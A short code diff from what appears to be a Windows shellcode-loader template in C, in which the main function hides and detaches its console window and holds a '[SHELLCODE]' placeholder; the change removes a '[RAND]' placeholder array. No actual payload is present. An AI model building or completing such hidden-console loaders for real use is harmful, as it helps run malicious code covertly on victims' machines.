@@ -19,7 +19,7 @@ int main() {
         if(VAR1 != NULL) {
                 VAR1(VAR10);
         }
-        char VAR2[] = "[RAND]";
+
         ShowWindow(GetConsoleWindow(), SW_HIDE);
         FreeConsole();
         char VAR3[] = "[SHELLCODE]";
